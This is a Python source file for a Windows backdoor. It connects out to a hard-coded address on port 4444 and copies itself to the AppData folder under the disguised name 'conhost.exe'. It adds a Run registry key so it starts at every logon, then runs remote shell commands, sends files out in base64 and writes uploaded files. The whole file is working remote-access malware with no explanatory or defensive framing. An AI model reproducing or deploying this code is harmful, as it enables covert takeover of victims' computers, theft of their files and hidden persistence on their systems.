#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import shutil


class Backdoor:

    def __init__(self, ip, port):
        self.persistent()
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))

    def persistent(self):
        file_location = os.environ['appdata'] + "\\conhost.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            cmd = 'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"'
            subprocess.call(cmd, shell=True)


    def serial_send(self, data):
        json_send = json.dumps(data)
        return self.s.send(json_send)

    def serial_recv(self):

        json_receiv = ""
        while True:
            try:
                json_receiv = json_receiv + self.s.recv(1024)
                return json.loads(json_receiv)
            except ValueError:
                continue

    def chgdir(self, path):

        try:
            path = os.chdir(path)
            return os.getcwd()
        except:
            print('{0} not found').format(path)

    def read_file(self, path):
        try:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    enc = f.read()
                    return base64.b64encode(enc)
            else:
                return "[-] File not found"
        except Exception:
            return "[-] File not found"
            # return f.read()

    def write_upload(self, path, content):
        if len(content) > 1:
            with open(path, "wb") as f:
                f.write(base64.b64decode(content))
        else:
            return "[-] Empty file, abording"

    def remote_cmd(self, command):

        DEVNULL = open(os.devnull, "wb")
        try:  # pass exec_cmd(self, command):

            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

        except subprocess.CalledProcessError or TypeError:
            return "[-] Command not found"
            # pass

    def run(self):

        while True:
            try:
                cmd = self.serial_recv()

                if cmd[0] == "exit":
                    self.s.close()
                    exit()

                elif cmd[0] == "cd" and len(cmd) > 1:
                    result = self.chgdir(cmd[1])

                elif cmd[0] == "download":

                    result = self.read_file(cmd[1])

                elif cmd[0] == "upload":
                    # TEST print(cmd[1], cmd[2])
                    result = self.write_upload(cmd[1], cmd[2])

                else:
                    result = self.remote_cmd(cmd)

                self.serial_send(result)


            except Exception:
                result = "[-] Command error "
                self.serial_send(result)
        # print(e)
        # pass

try:

    my_back = Backdoor("192.168.170.2", 4444)
    my_back.run()

except Exception:
    sys.exit(0)
